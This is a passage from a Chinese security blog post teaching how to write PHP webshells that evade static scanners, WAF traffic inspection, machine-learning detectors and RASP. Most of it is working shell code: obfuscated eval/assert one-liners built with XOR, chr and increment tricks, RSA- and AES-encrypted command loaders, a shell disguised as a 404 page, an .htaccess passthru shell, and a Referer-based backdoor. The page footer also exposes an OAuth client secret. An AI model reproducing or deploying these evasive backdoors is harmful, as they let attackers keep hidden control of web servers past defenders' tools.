+<pre><code class="language-php">$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).
+$_uU(110);
+$_=$_fF(&quot;&quot;,$_cC);
+@$_();
+</code></pre>
+<h3 id="3-字符串运算">(3) 字符串运算</h3>
+<p><strong>异或取反运算</strong></p>
+<pre><code class="language-php">@$_++;
+$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);         // $__的值为_POST
+@${$__}[!$_](${$__}[$_]);
+</code></pre>
+<p>通过异或运算(<code>^</code>)、取反运算(<code>!</code>)的方式组成一个webshell</p>
+<pre><code class="language-php">$_=(chr(0x01)^'`').(chr(0x13)^'`').(chr(0x13)^'`').(chr(0x05)^'`').(chr(0x12)^'`').(chr(0x14)^'`');
+$__='_'.(chr(0x0D)^']').(chr(0x2F)^'`').(chr(0x0E)^']').(chr(0x09)^']');
+$___=$$__;
+$_($___[_]);// assert($_POST[_]);
+</code></pre>
+<p>再比如：</p>
+<pre><code class="language-php">$a='999999999999999999999999'^urldecode('%5COXU%11%1DfivjmbXXXd%10%02');
+eval(/*echo*/($a));//password=aaa
+</code></pre>
+<p><strong>自增运算</strong></p>
+<p>因为在PHP中，<code>'a'++ =&gt; 'b'</code>，<code>'b'++ =&gt; 'c'</code>,所以我们如果得到了其中的一个字母，通过这个字符就可以得到所有的字母。通过<code>$_=[];$_=@&quot;$_&quot;;;</code>得到<code>$_</code>为<code>Array</code>的字符串，那么就可以得到所有的字符串了。</p>
+<pre><code class="language-php">$_=[];
+$_=@&quot;$_&quot;; // $_='Array';
+$_=$_['!'=='@']; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__++;$__++;$__++;$__++; // E 
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$___.=$__;
+$____='_';
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$____.=$__;
+
+$_=$$____;
+$___(base64_decode($_[_])); // ASSERT($_POST[_]);
+</code></pre>
+<p><strong>异或运算</strong></p>
+<p>这种异或运算得到的webshell与上面讲的通过异或运算不完全一样。在特定的编码情况下，一些字符串经过异或运算就能够得到一些特定的函数，这些函数就可以用于构造webshell</p>
+<pre><code class="language-php">$y=~督耽孩^'(1987)';
+$y($_POST[1987]);
+</code></pre>
+<p>上述的代码需要以<code>GBK</code>的方式保存,其中的<code>$y</code>的值为<code>assert</code>，这样就是一个典型的webshell了</p>
+<p>再比如：</p>
+<pre><code class="language-php">$b=~urldecode('%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%C4');
+$a=$b;
+eval(/*echo*/($a));//password=a
+</code></pre>
+<p>“~”的主要作用为取反，生成的不可见字符可以使用URL编码保存，这样检测时不会发现危险函数，也就不会发现我们的一句话木马</p>
+<h3 id="4-其他处理方式">(4) 其他处理方式</h3>
+<p><strong>进制转换</strong>，比较常见，通过十六进制和八进制混用的方式代替<code>base64_decode</code>:</p>
+<pre><code class="language-php">$v230c590=&quot;\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145&quot;;
+@eval($v230c590(.....
+</code></pre>
+<p><strong>编码</strong>，其实在上面的例子中都有的已经利用了一些编码方式，常见的base64, chr, rot13, gzip, zlib等，但这种常见的编码、多层嵌套编码方式等都已经能被很多WAF识别了</p>
+<p>字符串处理类的方式很多，任意的排列组合都可以产生新的东西</p>
+<h2 id="2关键字处理">2.关键字处理</h2>
+<p>很多软件只检查 $_POST，使用全局变量可以绕过</p>
+<pre><code class="language-php">@eval($GLOBALS['_POST']['pass']);
+</code></pre>
+<p>利用$_FILE</p>
+<pre><code class="language-php">@eval($_FILE['name']);
+</code></pre>
+<p>利用文件名，比如下述文件名为 no_assert.php：</p>
+<pre><code class="language-php">${&quot;function&quot;}=substr(__FILE__,-10,-4);;
+${&quot;command&quot;}=$_POST[cmd];
+$function($command);
+</code></pre>
+<p>通过目标服务器某些信息的唯一性，在其中进行取值拼接</p>
+<h2 id="3特殊字符干扰">3.特殊字符干扰</h2>
+<p>比较简单的如 \r\n\t  null  tab 进行干扰等等</p>
+<pre><code>$a = $_POST['a'];
+$b = &quot;\n&quot;;
+eval($b.=$a);
+</code></pre>
+<p>使用异或的方式也能产生一些特殊字符，绕过静态检测</p>
+<h2 id="4数组">4.数组</h2>
+<p>将循环的变量事先进行定义，可以降低查杀率，这是过狗的一个很实用的技巧，就是让狗以为你执行命令的参数为常量</p>
+<pre><code class="language-php">$value=$key = &quot;a&quot;;
+foreach($_POST as $key=&gt;$value){
+    assert($value);
+}
+</code></pre>
+<p>通过定义数组，再交给 eval 等处理</p>
+<pre><code class="language-php">$array = array(
+    233   =&gt; false,
+    42    =&gt; $_GET['SECQUAN'],
+);
+eval($array[233].$array[42]);
+?&gt;
+</code></pre>
+<p>利用substr 和 explode 在字符串和数组之间处理，本质上也是字符串拼接的方式</p>
+<pre><code class="language-php">error_reporting(0);
+$sss='';
+$s='';
+$s='123456eval(123456$_POST123456[&quot;1&quot;]);123456';
+$ss=array().explode(&quot;123456&quot;,$s)[1].explode(&quot;123456&quot;,$s)[2].explode(&quot;123456&quot;,$s)[3];
+$sss=substr($ss,5,100);
+eval($sss);
+</code></pre>
+<p>多维数组</p>
+<pre><code class="language-php">$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
+$a = array($arrayName = array('a' =&gt; $b($_POST['q'])));
+</code></pre>
+<h2 id="5函数">5.函数</h2>
+<p>将取值赋值放入自定义函数</p>
+<pre><code class="language-php">function a(){
+    return $a=$_POST['1'];
+}
+@assert(a());
+</code></pre>
+<p>结合可变函数</p>
+<pre><code class="language-php">function func() {
+    return &quot;ass&quot;.&quot;ert&quot;;
+}
+$a = func();
+$a(${&quot;_PO&quot;.&quot;ST&quot;}['sz']);
+</code></pre>
+<p>为了能够逃避防护软件的查杀，很多webshell都会自己编写加密函数或者是字符串转换函数</p>
+<pre><code class="language-php">$string='';
+$password='test';
+if(isset($_POST[$password])){
+    $hex=$_POST[$password];
+    for($i=0;$i&lt;strlen($hex)-1;$i+=2){
+    $string.=chr(hexdec($hex[$i].$hex[$i+1]));
+}
+@eval($string);
+</code></pre>
+<p>匿名函数</p>
+<pre><code class="language-php">//function __lambda_func(){@eval($_POST['f']);}
+$s = &quot;F9QivT1NUWyd&quot;;
+$v = &quot;QGivV2YivWwoJ&quot;;
+$j = &quot;mJ10pOw=iv=&quot;;
+$re = str_replace(&quot;iv&quot;, &quot;&quot;, &quot;sivtr_ivrepivlaivce&quot;);
+$ba = $re(&quot;nf&quot;, &quot;&quot;, &quot;bnfanfse6nf4_nfdecnfode&quot;);
+$fun = $re(&quot;vf&quot;, &quot;&quot;, &quot;cvfreavfte_fvfunctvfion&quot;);
+$vi = $fun(&quot;&quot;, $ba($re(&quot;iv&quot;, &quot;&quot;, $v . $s . $j)));
+$vi();
+</code></pre>
+<h2 id="6类">6.类</h2>
+<p>使用类进行调用，可以降低静态检测的查杀率</p>
+<pre><code class="language-php">class get{
+    public function setName($name=1){
+        return $this -&gt; name = $name;
+    }
+}
+$obj = new get();
+$s = $obj -&gt; setName(&quot;$_POST[1]&quot;);
+eval(null.$s);
+</code></pre>
+<p>经过测试，在类中传值，指定默认值的情况下会降低查杀率，很魔幻，感觉跟之前说的事先定义变量是一个道理</p>
+<p>再进一步使用接口继承</p>
+<pre><code class="language-php">interface lbw{
+    public function getshell($name);
+}
+
+class Demo implements lbw {
+    public $demo='s';
+    public function getshell($name)
+    {
+        echo eval($name);
+    }
+}
+$obj=new Demo();
+$obj-&gt;getshell($_GET['a']);
+</code></pre>
+<p>再扩展一下，可以先写类，然后子类继承等等，其实你写的越复杂，越接近业务逻辑代码，越容易绕过检测，然后你的一句话就活活写成了一页面向对象的代码</p>
+<p>除了单纯的函数、类之间的调用，其实还可以发现，一些敏感的关键字，有时候写在类中就不会报毒</p>
+<pre><code class="language-php">class evals{
+        protected $links;
+        function __construct($an){
+                $this-&gt;links = $an;
+                @eval(&quot;\$title=1;&quot;.$this-&gt;links);
+        }
+}
+$WebShell = new evals(@$_POST['An']);
+</code></pre>
+<p>针对回调函数，写在__construct/__destruct 方法中也会降低报毒几率</p>
+<pre><code class="language-php">$class = new \ReflectionClass('filter');
+$instance = $class-&gt;newInstance($_GET);
+unset($instance);
+class filter
+{
+
+    private $password = 'password';
+    public function __construct(array $data)
+    {
+        $this-&gt;data = $data;
+    }
+    public function __destruct()
+    {
+        if (array_key_exists($this-&gt;password, $this-&gt;data) &amp;&amp; !empty($this-&gt;data[$this-&gt;password])) {
+            eval($this-&gt;data[$this-&gt;password]);
+        }
+    }
+}
+</code></pre>
+<h2 id="7文件混淆加密">7.文件混淆加密</h2>
+<p>由于文件加密后无法被各种检测软件的文件解析模块解析，后续的检测手段就都失效了，但可能会直接报为加密，所以有利有弊</p>
+<h1 id="五-过流量检测">五、过流量检测</h1>
+<p>这里的流量检测就是在网络层的waf拦截到我们向webshell传输的数据包，以及webshell返回的数据包，检测其中是否包含敏感信息的一种检测方式</p>
+<p>如果是大马的情况下，可以在大马中添加多处<strong>判断代码</strong>，因此在执行大马提供的功能时不直接传递关键字，而是只传递标识位，如 A 是端口扫描，B 是 上传文件，流量就可能为 <code>action=A</code>，这可以在一定程度上绕过检测</p>
+<p>但过这种方式更加屡试不爽的方式就是在<strong>双端都进行非对称加解密操作</strong>，这种方式WAF是绝对不敢拦的，因为他不可能解析的了数据包，而且正常业务逻辑为了保证数据的完整性和保密性也会如此传递数据</p>
+<p>比较常见的使用 RSA 进行加密（蚁剑 php shell）</p>
+<pre><code class="language-php">$cmd = @$_POST['ant'];
+$publicKey = &lt;&lt;&lt;EOF
+-----BEGIN PUBLIC KEY-----
+Input your Public Key
+-----END PUBLIC KEY-----
+EOF;
+$cmds = explode(&quot;|&quot;, $cmd);
+$publicKey = openssl_pkey_get_public($publicKey);
+$cmd = '';
+foreach ($cmds as $value) {
+    if (openssl_public_decrypt(base64_decode($value), $de, $publicKey)) {
+        $cmd .= $de;
+    }
+}
+eval($cmd);
+</code></pre>
+<p>传递的数据格式为：</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1572579331257.png" alt="" loading="lazy"></figure>
+<p>使用AES加密（冰蝎 php shell）：</p>
+<pre><code class="language-php">@error_reporting(0);
+session_start();
+if (isset($_GET['pass']))
+{
+    $key=substr(md5(uniqid(rand())),16);
+    $_SESSION['k']=$key;
+    print $key;
+}
+else
+{
+    $key=$_SESSION['k'];
+	$post=file_get_contents(&quot;php://input&quot;);
+	if(!extension_loaded('openssl'))
+	{
+		$t=&quot;base64_&quot;.&quot;decode&quot;;
+		$post=$t($post.&quot;&quot;);
+		
+		for($i=0;$i&lt;strlen($post);$i++) {
+    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);
+	}
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __construct($p) {eval($p.&quot;&quot;);}}
+	@new C($params);
+}
+</code></pre>
+<p>传递数据格式为：</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1572579310015.png" alt="" loading="lazy"></figure>
+<p>我想问问，这谁敢拦啊？</p>
+<p>除了 RSA/AES/DES 等方式外，你也可以自己变成编码/加密方式，只要做到传输的数据除了你自己的控制端鬼都认不出来，那你就成功了</p>
+<p>此处需要注意的是，一定要是双端加密，也就是不管是请求包还是响应包，都是密文，双端都有加解密的操作，不然被WAF识别到了返回包里的敏感内容一样前功尽弃</p>
+<p>除了流量加密，还有就是<strong>multipart分片发包</strong>，在前一段时间的绕WAF技术上也是引起了广泛的讨论</p>
+<p>在网上还见了一种<strong>层级请求</strong>，编码运行PHP后门，通过2个PHP文件实现</p>
+<pre><code class="language-php">&lt;?php
+//1.php
+header('Content-type:text/html;charset=utf-8');
+parse_str($_SERVER['HTTP_REFERER'], $a);
+if(reset($a) == '10' &amp;&amp; count($a) == 9) {
+eval(base64_decode(str_replace(&quot; &quot;, &quot;+&quot;, implode(array_slice($a, 6)))));
+}
+</code></pre>
+<p>第二个文件</p>
+<pre><code class="language-php">&lt;?php   
+//2.php   header('Content-type:text/html;charset=utf-8');   
+//要执行的代码   $code = &lt;&lt;&lt;CODE   phpinfo();   
+CODE;   
+//进行base64编码   
+$code = base64_encode($code);   
+//构造referer字符串   
+$referer = &quot;a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g={$code}&amp;h=&amp;i=&quot;;   //后门url   $url = 'http://localhost/test1/1.php';   
+$ch = curl_init();   
+$options = array(   
+    CURLOPT_URL =&gt; $url,   
+    CURLOPT_HEADER =&gt; FALSE,   
+    CURLOPT_RETURNTRANSFER =&gt; TRUE,   
+    CURLOPT_REFERER =&gt; $referer   
+);   
+curl_setopt_array($ch, $options);   
+echo curl_exec($ch);
+</code></pre>
+<p>通过HTTP请求中的<strong>HTTP_REFERER</strong>来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测</p>
+<p>流量层除了对流量本身的识别模式之外，还有很多的识别方式，比如访问时间、访问次数、访问人员等等方面的综合判定，都可以识别出异常，这种情况下就要考虑到下面提到的<strong>匿名化攻击</strong>了</p>
+<h1 id="六-过机器学习算法检测">六、过机器学习算法检测</h1>
+<p>随着科技发展，现在越来越多的厂商开始尝试并使用机器学习算法进行恶意文件、恶意流量的检测</p>
+<p>不论是使用分类算法、还是使用神经网络、深度学习、异常检测算法，能想到的方式有几种</p>
+<ul>
+<li>收集webshell作为训练样本，训练好的模型进行分类，本质上是黑名单训练，典型的如One Class SVM</li>
+<li>有针对性的收集正常PHP业务逻辑代码和流量，进行白名单训练</li>
+<li>结合各项特征，完全进行聚类算法</li>
+<li>基于统计学，构建概率分布模型</li>
+<li>使用孤立森林等算法进行无监督的异常检测</li>
+<li>结合更高维度特征，如威胁情报、黑客画像、攻击手法等等，扩展特征维度，弱化代码、流量本身的权重占比</li>
+<li>等等</li>
+</ul>
+<p>大多数实现的算法本质上都是提取相关特征进行识别，这种情况下想要绕过检测和识别，是稍微有点头疼的，因为有时候机器学习模型不需要认识你是恶意代码，只需要发现你跟正常逻辑代码不同就可以了，但是由于PHP的诸多特性，编写PHP代码的人员水平参差不齐，编写习惯不同，加上早期PHP面向过程的编制占到了大多数，因此在其中提取统一的相似性的成本和难度大大增加，所以还是可以绕过的，大体的思路有几种：</p>
+<h2 id="1加密文件">1.加密文件</h2>
+<p>对文件加密后，机器学习算法的识别就产生了巨大的偏差，在某些黑名单算法下无法有效识别，但很容易被静态检测报出威胁</p>
+<h2 id="2模拟正常业务代码逻辑">2.模拟正常业务代码逻辑</h2>
+<p>恶意webshell写的越像正常业务代码，越容易绕过检测，无论是静态检测还是机器学习算法</p>
+<p>对于流量层面，模拟其他正常业务逻辑的传参方式，必要时完全模拟其他参数的传递，这样可以也可以污染一些机器学习模型动态学习时的训练数据</p>
+<p>使用类、函数进行webshell编写，增加代码互相调用的复杂度</p>
+<p>同时避免使用常见的webshell中常用的一些字符处理函数，避免某些关键字在训练模型中出现频率较高导致报警</p>
+<p>这部分根据不同的算法绕过的方式也是不同的，需要视情况而定</p>
+<h2 id="3匿名化进攻">3.匿名化进攻</h2>
+<p>使用白IP进行攻击探测，使用代理池分散恶意流量，在正常业务访问时间进行探测，降低其他维度对攻击行为的标签，来绕过多维度特征的机器学习算法的检测，这部分超出了PHP代码本身，不再进行讨论</p>
+<h2 id="4注释">4.注释</h2>
+<p>使用注释进行PHP的混淆，对检测源码的机器学习算法是一个巨大的挑战</p>
+<p>虽然机器学习模型的杀伤力理论上远远大于基于规则的传统WAF，但是实际上目前在效率和成本的衡量上目前还是传统WAF占据主流，可能某些大厂在样本数据庞大的情况下可能已经拥有了较好的模型，但是也不可能拿出来给你用，基于PHP本身的灵活及动态性，可以看到机器学习算法在不使用多维度多方面的综合考量情况下很难发挥出好的作用</p>
+<h1 id="七-rasp防御">七、RASP防御</h1>
+<p>PHP RASP方案是通过扩展模块实现对规则对应的恶意函数行为、上下文内容的判断和阻断，可以说 RASP 在未来一段时间内将逐渐取代流量层 WAF 称为主流防御方式</p>
+<p>RASP 的技术核心就是一个词：Hook，但实际上最关键的并不是 Hook 动作的本身，而是取决于 Hook 之后的操作，安全开发人员根据自身经验进行的检测动作</p>
+<p>在php中，调用 eval 等代码执行的函数，最终会调用 php 内核的 zend_compile_string 函数，因此只要 Hook 掉这个函数，把动作限死，一句话类的webshell都失效了</p>
+<p>这种情况下我们可以使用小马、大马，直接把功能写出来，就绕过了这个点，但是既然是 RASP，就没那么简单</p>
+<p>现在新版本的这些侵入式的防护产品，除了 Hook 了代码执行这一块，也一并把文件IO，命令执行这些都做了，根据 web 文件的行为来判断是否是 webshell。典型的比如：读取了非 web 目录下的文件，执行异常的命令等等</p>
+<p>理论上，只要 Hook 做的全，检测规则想的全面，确实是很难绕过的，因为退一万步讲，即使你成功上传了webshell，你执行的其他动作都是非常规的，都是可以被检测的</p>
+<p>但实际上，安全开发人员也是人，不一定能坐到面面俱到，因此，在相关技术没积累到十分成熟之前，根据实际情况还是可以试一试的</p>
+<p>对于OpenRASP WebShell 沙盒检测，已经有大佬 LandGrey 提出想法，利用信息不对称性绕过检测，地址https://xz.aliyun.com/t/2335</p>
+<h1 id="八-伪装">八、伪装</h1>
+<p>讨论了各种检测方式绕过之后，还有一种绕过是针对人的绕过，也就是针对一些管理员、开发人员或者同行之间，通过各种方式伪装自己的木马，或多或少还是能起到一些作用的</p>
+<p>将页面伪装成404的木马：</p>
+<pre><code class="language-php+HTML">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;
+&lt;?php
+@preg_replace(&quot;/[pageerror]/e&quot;,$_POST['error'],&quot;saft&quot;);
+header('HTTP/1.1 404 Not Found');
+?&gt;
+</code></pre>
+<p>图片马，配合解析漏洞、htaccess、ini配置文件修改，进行隐藏，例如：</p>
+<pre><code class="language-conf">#首先允许web访问这个文件
+
+&lt;Files ~ &quot;^\.ht&quot;&gt;
+Order allow,deny
+Allow from all
+&lt;/Files&gt;
+
+RedirectMatch 403 .htaccess$
+#.htaccess结尾的403错误，这里是为了增加隐蔽性
+
+AddType application/x-httpd-php .htaccess
+#给.htaccess映射php拓展
+
+### SHELL ### &lt;?php echo &quot;\n&quot;;passthru($_GET['c'].&quot; 2&gt;&amp;1&quot;); ?&gt;### KINDLE ###
+#恶意的php代码
+使用方法:http://localhost/.htaccess/?c=dir
+</code></pre>
+<p>等等</p>
+<h1 id="九-php大马编写">九、PHP大马编写</h1>
+<p>在简单了解了上述知识后，为了练习 PHP 编码能力，学以致用，我花了一些时间编写了一个PHP大马，用作学习总结和免杀测试。</p>
+<p>GITHUB地址: https://github.com/su18/Stitch</p>
+<p>部分截图：</p>
+<p>首页：<br>
+<img src="https://su18.org/post-images/1572579560289.png" alt="" loading="lazy"><br>
+文件管理：<br>
+<img src="https://su18.org/post-images/1572579547389.png" alt="" loading="lazy"><br>
+命令执行：<br>
+<img src="https://su18.org/post-images/1572579540769.png" alt="" loading="lazy"><br>
+代码执行：<br>
+<img src="https://su18.org/post-images/1572579531388.png" alt="" loading="lazy"><br>
+端口扫描：<br>
+<img src="https://su18.org/post-images/1572579520683.png" alt="" loading="lazy"><br>
+数据库执行：<br>
+<img src="https://su18.org/post-images/1572579512298.png" alt="" loading="lazy"><br>
+LD_PRELOAD：<br>
+<img src="https://su18.org/post-images/1572579503750.png" alt="" loading="lazy"><br>
+消息提示：<br>
+<img src="https://su18.org/post-images/1572579493526.png" alt="" loading="lazy"></p>
+<p>具体情况请移步GITHUB观看，有兴趣可以下载尝试，欢迎交流。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%B8%80-%E5%89%8D%E8%A8%80">一、前言</a></li>
+<li><a href="#%E4%BA%8C-%E7%AE%80%E4%BB%8B">二、简介</a>
+<ul>
+<li><a href="#1%E4%B8%80%E5%8F%A5%E8%AF%9D">1.一句话</a></li>
+<li><a href="#2%E5%B0%8F%E9%A9%AC">2.小马</a></li>
+<li><a href="#3%E5%A4%A7%E9%A9%AC">3.大马</a></li>
+<li><a href="#4%E4%B8%8D%E6%AD%BB%E9%A9%AC">4.不死马</a></li>
+<li><a href="#5%E6%97%A0%E6%96%87%E4%BB%B6%E6%9C%A8%E9%A9%AC">5.无文件木马</a></li>
+<li><a href="#6%E8%A0%95%E8%99%AB%E9%A9%AC">6.蠕虫马</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89-%E5%8A%A8%E6%80%81%E6%80%A7%E6%8E%A2%E7%A9%B6">三、动态性探究</a>
+<ul>
+<li><a href="#1%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F">1.可变变量</a></li>
+<li><a href="#2%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0">2.可变函数</a></li>
+<li><a href="#3%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">3.回调函数</a></li>
+<li><a href="#4%E5%8F%8D%E5%B0%84%E6%8A%80%E6%9C%AF">4.反射技术</a></li>
+<li><a href="#5%E6%AD%A3%E5%88%99-e-%E6%A8%A1%E5%BC%8F">5.正则 \e 模式</a></li>
+<li><a href="#6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A7%E8%A1%8C">6.反序列化执行</a></li>
+<li><a href="#7%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5">7.文件引入</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B-%E8%BF%87%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B">四、过静态检测</a>
+<ul>
+<li><a href="#1%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86">1.字符串处理</a>
+<ul>
+<li><a href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E5%BD%A2">(1) 字符串变形</a></li>
+<li><a href="#2-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5">(2) 字符串拼接</a></li>
+<li><a href="#3-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%90%E7%AE%97">(3) 字符串运算</a></li>
+<li><a href="#4-%E5%85%B6%E4%BB%96%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F">(4) 其他处理方式</a></li>
+</ul>
+</li>
+<li><a href="#2%E5%85%B3%E9%94%AE%E5%AD%97%E5%A4%84%E7%90%86">2.关键字处理</a></li>
+<li><a href="#3%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%B9%B2%E6%89%B0">3.特殊字符干扰</a></li>
+<li><a href="#4%E6%95%B0%E7%BB%84">4.数组</a></li>
+<li><a href="#5%E5%87%BD%E6%95%B0">5.函数</a></li>
+<li><a href="#6%E7%B1%BB">6.类</a></li>
+<li><a href="#7%E6%96%87%E4%BB%B6%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86">7.文件混淆加密</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%94-%E8%BF%87%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B">五、过流量检测</a></li>
+<li><a href="#%E5%85%AD-%E8%BF%87%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%E6%A3%80%E6%B5%8B">六、过机器学习算法检测</a>
+<ul>
+<li><a href="#1%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6">1.加密文件</a></li>
+<li><a href="#2%E6%A8%A1%E6%8B%9F%E6%AD%A3%E5%B8%B8%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91">2.模拟正常业务代码逻辑</a></li>
+<li><a href="#3%E5%8C%BF%E5%90%8D%E5%8C%96%E8%BF%9B%E6%94%BB">3.匿名化进攻</a></li>
+<li><a href="#4%E6%B3%A8%E9%87%8A">4.注释</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%83-rasp%E9%98%B2%E5%BE%A1">七、RASP防御</a></li>
+<li><a href="#%E5%85%AB-%E4%BC%AA%E8%A3%85">八、伪装</a></li>
+<li><a href="#%E4%B9%9D-php%E5%A4%A7%E9%A9%AC%E7%BC%96%E5%86%99">九、PHP大马编写</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://su18.org/post/hello-world/">
+              <h3 class="post-title">
+                您好，我叫素十八
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
